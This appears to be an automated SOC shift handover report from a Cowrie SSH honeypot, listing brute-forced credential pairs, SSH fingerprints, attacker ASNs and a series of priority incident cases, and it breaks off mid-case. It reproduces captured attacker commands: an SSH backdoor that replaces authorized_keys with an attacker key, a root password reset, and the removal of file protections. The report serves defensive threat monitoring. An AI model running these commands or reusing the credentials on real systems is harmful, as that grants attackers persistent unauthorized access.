# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-24 |
| **Generated At** | 2026-05-24T17:07:21Z |
| **Shift Time** | 17:07 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **245** |
| Confirmed Threats | **185** |
| False Positives Filtered | **60** (24.5%) |
| Unique Attacker IPs | **35** |
| Countries of Origin | **15** |
| High Severity Cases | **53** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **192** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **113** |
| Unique Credential Pairs | **64** |
| Unique Usernames | **38** |
| Unique Passwords | **57** |
| Successful Auth Pairs | **36** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 53 |
| `345gs5662d34` | 24 |
| `julian` | 1 |
| `vncuser` | 1 |
| `luca` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 26 |
| `345gs5662d34` | 24 |
| `123` | 4 |
| `123456` | 3 |
| `Abc12345!` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 26 |
| `345gs5662d34` | `345gs5662d34` | 24 |
| `root` | `Abc12345!` | 2 |
| `root` | `!QAZxsw2#EDCvfr4` | 1 |
| `julian` | `julian123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `!QAZxsw2#EDCvfr4` | `40.112.183.29` | 2026-05-24T15:11:30 |
| `root` | `3245gs5662d34` | `40.112.183.29` | 2026-05-24T15:11:38 |
| `root` | `qwe123456` | `120.48.78.222` | 2026-05-24T15:14:49 |
| `root` | `3245gs5662d34` | `120.48.78.222` | 2026-05-24T15:15:10 |
| `root` | `1q2w3e4r!@` | `40.112.183.29` | 2026-05-24T15:17:00 |
| `root` | `Qwerty1234` | `40.112.183.29` | 2026-05-24T15:22:42 |
| `root` | `Aa@123321` | `40.112.183.29` | 2026-05-24T15:28:15 |
| `root` | `P@$$w0rd2025` | `40.112.183.29` | 2026-05-24T15:33:59 |
| `root` | `Lq123456` | `186.56.11.2` | 2026-05-24T15:40:41 |
| `root` | `3245gs5662d34` | `186.56.11.2` | 2026-05-24T15:40:51 |
| `root` | `123asdZXC` | `186.56.11.2` | 2026-05-24T15:46:00 |
| `root` | `qqww1122` | `186.56.11.2` | 2026-05-24T15:51:30 |
| `root` | `0okm(IJN8uhb` | `120.48.78.222` | 2026-05-24T15:52:09 |
| `root` | `1qaz2wsx3EDC` | `101.126.23.159` | 2026-05-24T15:53:36 |
| `root` | `3245gs5662d34` | `101.126.23.159` | 2026-05-24T15:53:42 |
| `root` | `Abc12345!` | `40.83.182.122` | 2026-05-24T15:55:53 |
| `root` | `3245gs5662d34` | `40.83.182.122` | 2026-05-24T15:55:58 |
| `root` | `qweasd123!` | `101.126.23.159` | 2026-05-24T15:56:37 |
| `root` | `100200300` | `186.56.11.2` | 2026-05-24T16:06:41 |
| `root` | `Abc12345!` | `101.36.122.186` | 2026-05-24T16:08:07 |
| `root` | `3245gs5662d34` | `101.36.122.186` | 2026-05-24T16:08:10 |
| `root` | `123@qwe` | `101.36.122.186` | 2026-05-24T16:11:47 |
| `root` | `qwe123456.` | `45.78.194.242` | 2026-05-24T16:17:49 |
| `root` | `3245gs5662d34` | `45.78.194.242` | 2026-05-24T16:17:52 |
| `root` | `Qaz123321` | `101.36.122.186` | 2026-05-24T16:19:15 |
| `root` | `1qaz!@#$` | `186.56.11.2` | 2026-05-24T16:22:26 |
| `root` | `A1b2c3d4` | `101.36.122.186` | 2026-05-24T16:23:05 |
| `root` | `!QAZ2wsx#EDC4rfv` | `101.36.122.186` | 2026-05-24T16:26:52 |
| `root` | `Xq123456.` | `186.56.11.2` | 2026-05-24T16:27:49 |
| `root` | `senha123` | `103.183.75.60` | 2026-05-24T16:31:40 |
| `root` | `3245gs5662d34` | `103.183.75.60` | 2026-05-24T16:31:45 |
| `root` | `master123!` | `101.126.89.144` | 2026-05-24T16:42:36 |
| `root` | `3245gs5662d34` | `101.126.89.144` | 2026-05-24T16:42:46 |
| `root` | `vikas123` | `101.126.89.144` | 2026-05-24T16:43:10 |
| `root` | `Qwerty11` | `101.126.89.144` | 2026-05-24T16:43:43 |
| `root` | `qwer1234!` | `101.126.89.144` | 2026-05-24T16:48:40 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **245** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 129 |
| Go SSH scanner | 3 |
| Paramiko (Python) | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 84 | 10 |
| `03a80b21afa8...` | Modern SSH client | 39 | 2 |
| `af8223ac9914...` | libssh-based | 3 | 1 |
| `084386fa7ae5...` | Mirai/variant | 2 | 2 |
| `d6729b7f2442...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 84 | 10 | Mirai/variant |
| `03a80b21afa8...` | libssh | 39 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 3 | 2 | — |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `d6729b7f2442...` | Paramiko (Python) | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 26 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:Irp3LvGAczIH"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.78.222`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `40.83.182.122`, `101.36.122.186`, `120.48.78.222`, `40.112.183.29`, `45.78.194.242`, `103.183.75.60`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **35** |
| Unique ASNs | **27** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 1 | HIGH |
| `AS5650` | Frontier Communications of America, Inc. | 1 | LOW |
| `AS5384` | Emirates Internet | 1 | MEDIUM |
| `AS55286` | B2 Net Solutions Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (53)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-2967437ffb8b

| Field | Detail |
|---|---|
| **Source IP** | `40.112.183[.]29` |
| **First Seen** | 2026-05-24 15:11 |
| **Last Seen** | 2026-05-24 15:11 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:11:28` | `cowrie.session.connect` |
| `2026-05-24 15:11:28` | `cowrie.client.version` |
| `2026-05-24 15:11:29` | `cowrie.client.kex` |
| `2026-05-24 15:11:30` | `cowrie.login.success` |
| `2026-05-24 15:11:30` | `cowrie.session.params` |
| `2026-05-24 15:11:30` | `cowrie.command.input` |
| `2026-05-24 15:11:30` | `cowrie.command.failed` |
| `2026-05-24 15:11:31` | `cowrie.log.closed` |
| `2026-05-24 15:11:32` | `cowrie.session.params` |
| `2026-05-24 15:11:32` | `cowrie.command.input` |
| `2026-05-24 15:11:33` | `cowrie.session.file_download` |
| `2026-05-24 15:11:33` | `cowrie.log.closed` |
| `2026-05-24 15:11:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.112.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `40.112.183[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5441d69118b

| Field | Detail |
|---|---|
| **Source IP** | `40.112.183[.]29` |
| **First Seen** | 2026-05-24 15:11 |
| **Last Seen** | 2026-05-24 15:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:11:36` | `cowrie.session.connect` |
| `2026-05-24 15:11:36` | `cowrie.client.version` |
| `2026-05-24 15:11:36` | `cowrie.client.kex` |
| `2026-05-24 15:11:38` | `cowrie.login.success` |
| `2026-05-24 15:11:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.112.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `40.112.183[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b7be2618bfc

| Field | Detail |
|---|---|
| **Source IP** | `120.48.78[.]222` |
| **First Seen** | 2026-05-24 15:14 |
| **Last Seen** | 2026-05-24 15:15 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:14:48` | `cowrie.session.connect` |
| `2026-05-24 15:14:48` | `cowrie.client.version` |
| `2026-05-24 15:14:48` | `cowrie.client.kex` |
| `2026-05-24 15:14:49` | `cowrie.login.success` |
| `2026-05-24 15:14:50` | `cowrie.session.params` |
| `2026-05-24 15:14:50` | `cowrie.command.input` |
| `2026-05-24 15:14:50` | `cowrie.command.failed` |
| `2026-05-24 15:14:51` | `cowrie.log.closed` |
| `2026-05-24 15:14:52` | `cowrie.session.params` |
| `2026-05-24 15:14:52` | `cowrie.command.input` |
| `2026-05-24 15:14:52` | `cowrie.session.file_download` |
| `2026-05-24 15:14:52` | `cowrie.log.closed` |
| `2026-05-24 15:15:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.78[.]222` to AbuseIPDB if not already reported
- [ ] Block `120.48.78[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-875974b8392b

| Field | Detail |
|---|---|
| **Source IP** | `120.48.78[.]222` |
| **First Seen** | 2026-05-24 15:15 |
| **Last Seen** | 2026-05-24 15:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:15:06` | `cowrie.session.connect` |
| `2026-05-24 15:15:06` | `cowrie.client.version` |
| `2026-05-24 15:15:07` | `cowrie.client.kex` |
| `2026-05-24 15:15:10` | `cowrie.login.success` |
| `2026-05-24 15:15:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.78[.]222` to AbuseIPDB if not already reported
- [ ] Block `120.48.78[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee407089fd2a

| Field | Detail |
|---|---|
| **Source IP** | `40.112.183[.]29` |
| **First Seen** | 2026-05-24 15:16 |
| **Last Seen** | 2026-05-24 15:17 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:16:57` | `cowrie.session.connect` |
| `2026-05-24 15:16:57` | `cowrie.client.version` |
| `2026-05-24 15:16:57` | `cowrie.client.kex` |
| `2026-05-24 15:17:00` | `cowrie.login.success` |
| `2026-05-24 15:17:00` | `cowrie.session.params` |
| `2026-05-24 15:17:00` | `cowrie.command.input` |
| `2026-05-24 15:17:00` | `cowrie.command.failed` |
| `2026-05-24 15:17:01` | `cowrie.log.closed` |
| `2026-05-24 15:17:01` | `cowrie.session.params` |
| `2026-05-24 15:17:01` | `cowrie.command.input` |
| `2026-05-24 15:17:02` | `cowrie.session.file_download` |
| `2026-05-24 15:17:02` | `cowrie.log.closed` |
| `2026-05-24 15:17:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.112.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `40.112.183[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bb063ed4211

| Field | Detail |
|---|---|
| **Source IP** | `40.112.183[.]29` |
| **First Seen** | 2026-05-24 15:17 |
| **Last Seen** | 2026-05-24 15:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:17:06` | `cowrie.session.connect` |
| `2026-05-24 15:17:06` | `cowrie.client.version` |
| `2026-05-24 15:17:06` | `cowrie.client.kex` |
| `2026-05-24 15:17:08` | `cowrie.login.success` |
| `2026-05-24 15:17:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.112.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `40.112.183[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a582b85ee149

| Field | Detail |
|---|---|
| **Source IP** | `40.112.183[.]29` |
| **First Seen** | 2026-05-24 15:22 |
| **Last Seen** | 2026-05-24 15:22 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:22:40` | `cowrie.session.connect` |
| `2026-05-24 15:22:41` | `cowrie.client.version` |
| `2026-05-24 15:22:41` | `cowrie.client.kex` |
| `2026-05-24 15:22:42` | `cowrie.login.success` |
| `2026-05-24 15:22:44` | `cowrie.session.params` |
| `2026-05-24 15:22:44` | `cowrie.command.input` |
| `2026-05-24 15:22:44` | `cowrie.command.failed` |
| `2026-05-24 15:22:44` | `cowrie.log.closed` |
| `2026-05-24 15:22:45` | `cowrie.session.params` |
| `2026-05-24 15:22:45` | `cowrie.command.input` |
| `2026-05-24 15:22:45` | `cowrie.session.file_download` |
| `2026-05-24 15:22:45` | `cowrie.log.closed` |
| `2026-05-24 15:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.112.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `40.112.183[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c750ff5763d7

| Field | Detail |
|---|---|
| **Source IP** | `40.112.183[.]29` |
| **First Seen** | 2026-05-24 15:22 |
| **Last Seen** | 2026-05-24 15:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:22:49` | `cowrie.session.connect` |
| `2026-05-24 15:22:50` | `cowrie.client.version` |
| `2026-05-24 15:22:50` | `cowrie.client.kex` |
| `2026-05-24 15:22:52` | `cowrie.login.success` |
| `2026-05-24 15:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.112.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `40.112.183[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e3b9f488eb8

| Field | Detail |
|---|---|
| **Source IP** | `40.112.183[.]29` |
| **First Seen** | 2026-05-24 15:28 |
| **Last Seen** | 2026-05-24 15:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:28:13` | `cowrie.session.connect` |
| `2026-05-24 15:28:13` | `cowrie.client.version` |
| `2026-05-24 15:28:14` | `cowrie.client.kex` |
| `2026-05-24 15:28:15` | `cowrie.login.success` |
| `2026-05-24 15:28:16` | `cowrie.session.params` |
| `2026-05-24 15:28:16` | `cowrie.command.input` |
| `2026-05-24 15:28:16` | `cowrie.command.failed` |
| `2026-05-24 15:28:16` | `cowrie.log.closed` |
| `2026-05-24 15:28:16` | `cowrie.session.params` |
| `2026-05-24 15:28:16` | `cowrie.command.input` |
| `2026-05-24 15:28:17` | `cowrie.session.file_download` |
| `2026-05-24 15:28:17` | `cowrie.log.closed` |
| `2026-05-24 15:28:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.112.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `40.112.183[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fa9eb062cd0

| Field | Detail |
|---|---|
| **Source IP** | `40.112.183[.]29` |
| **First Seen** | 2026-05-24 15:28 |
| **Last Seen** | 2026-05-24 15:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:28:20` | `cowrie.session.connect` |
| `2026-05-24 15:28:20` | `cowrie.client.version` |
| `2026-05-24 15:28:20` | `cowrie.client.kex` |
| `2026-05-24 15:28:22` | `cowrie.login.success` |
| `2026-05-24 15:28:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.112.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `40.112.183[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-029c433d0c5e

| Field | Detail |
|---|---|
| **Source IP** | `40.112.183[.]29` |
| **First Seen** | 2026-05-24 15:33 |
| **Last Seen** | 2026-05-24 15:34 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:33:56` | `cowrie.session.connect` |
| `2026-05-24 15:33:57` | `cowrie.client.version` |
| `2026-05-24 15:33:57` | `cowrie.client.kex` |
| `2026-05-24 15:33:59` | `cowrie.login.success` |
| `2026-05-24 15:33:59` | `cowrie.session.params` |
| `2026-05-24 15:33:59` | `cowrie.command.input` |
| `2026-05-24 15:33:59` | `cowrie.command.failed` |
| `2026-05-24 15:34:00` | `cowrie.log.closed` |
| `2026-05-24 15:34:00` | `cowrie.session.params` |
